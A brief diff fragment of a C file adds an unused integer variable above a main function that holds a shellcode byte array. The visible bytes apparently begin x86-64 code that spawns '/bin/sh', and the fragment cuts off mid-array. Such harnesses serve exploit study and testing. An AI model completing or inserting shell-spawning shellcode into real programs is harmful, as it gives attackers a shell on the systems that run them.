@@ -1,5 +1,7 @@
 #include <stdio.h>
 
+int foo = 0x37;
+
 int main() {
   const char shellcode[] =
       "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
